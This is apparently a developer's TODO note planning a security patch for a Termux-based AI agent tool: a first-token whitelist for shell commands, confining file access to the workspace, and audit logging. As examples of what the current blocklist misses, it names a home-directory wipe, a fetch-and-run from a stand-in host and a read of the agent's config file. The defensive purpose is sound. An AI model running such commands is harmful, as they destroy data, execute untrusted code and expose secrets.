# TODO

## Security patch (write tomorrow)

Two real problems in the current code:

1. Shell blocklist is weak — only 11 strings. Doesn't catch
   `rm -rf ~/`, `curl evil.sh | sh`, or `cat ~/.agent042/config.json`.
   Fix: whitelist of safe first-tokens + prompt for everything else.

2. No path confinement — model can read/write anywhere Termux can reach.
   Fix: resolve every path, refuse anything outside the workspace,
   explicitly block ~/.agent042.

Plus: audit log of every tool call to ~/.agent042/audit.log.

Full patch is in the chat history from Oct 9. Five sections:
  1. Add ALLOWED_SHELL_FIRST_TOKEN whitelist near the top
  2. Rewrite _safe() to return (path, error) and confine to workspace
  3. Update every caller of _safe() to unpack the tuple
  4. Rewrite tool_run_shell with _classify_shell() helper
  5. Add _audit_log() wrapper around dispatch_tool

Estimated: 45 min to apply and test.
